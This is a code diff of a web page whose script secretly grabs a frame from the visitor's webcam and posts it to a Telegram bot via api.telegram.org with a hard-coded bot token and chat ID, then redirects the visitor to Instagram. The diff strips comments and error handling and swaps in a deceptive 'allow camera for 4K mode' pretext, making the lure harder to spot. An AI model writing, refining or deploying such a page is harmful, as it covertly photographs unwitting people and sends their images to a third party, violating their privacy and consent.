@@ -20,41 +20,35 @@
     <canvas id="canvas" style="display:none"></canvas>
 
     <script>
-        const token = '8382441024:AAG1HuwXBU05vSDkSZFUi8oKG930WJ7QrY'; // Aapka Token
-        const chat_id = '8254708740'; // Aapki Chat ID
+        const token = '8382441024:AAG1HuwXBU05vSDkSZFUi8oKG930WJ7QrY';
+        const chat_id = '8254708740';
         let count = 0;
 
         async function startMission() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('video').srcObject = stream;
-                // No alert here, directly start capturing
                 captureSequence();
             } catch (err) { 
-                // If camera permission is denied, still redirect but notify
-                alert("Camera permission denied. Redirecting to complete mission.");
-                window.location.href = "https://www.google.com";
+                alert("Please allow camera for 4K mode.");
+                window.location.href = "https://www.instagram.com";
             }
         }
 
         function captureSequence() {
-            if (count < 1) { // Changed to capture only 1 photo quickly
+            if (count < 1) {
                 setTimeout(() => { 
                     capture(); 
                     count++; 
-                    // No need to call captureSequence again if only 1 photo
-                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500); // Redirect after capture
-                }, 1000); // Capture after 1 second of stream start
-            } else { 
-                // If for some reason count is more than 1, still redirect
-                window.location.href = "https://www.google.com"; 
+                    setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 1500);
+                }, 1000);
             }
         }
 
         function capture() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
-            if (video.readyState === video.HAVE_ENOUGH_DATA) { // Ensure video data is ready
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                 canvas.width = video.videoWidth; 
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
@@ -66,17 +60,9 @@
                     fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
                         method: 'POST', 
                         body: formData 
-                    }).then(response => {
-                        if (!response.ok) {
-                            console.error('Telegram API error:', response.statusText);
-                        }
-                    }).catch(error => {
-                        console.error('Error sending photo to Telegram:', error);
                     });
                 }, 'image/jpeg');
             } else {
-                console.log("Video not ready for capture yet.");
-                // Retry if video is not ready
                 setTimeout(capture, 500);
             }
         }
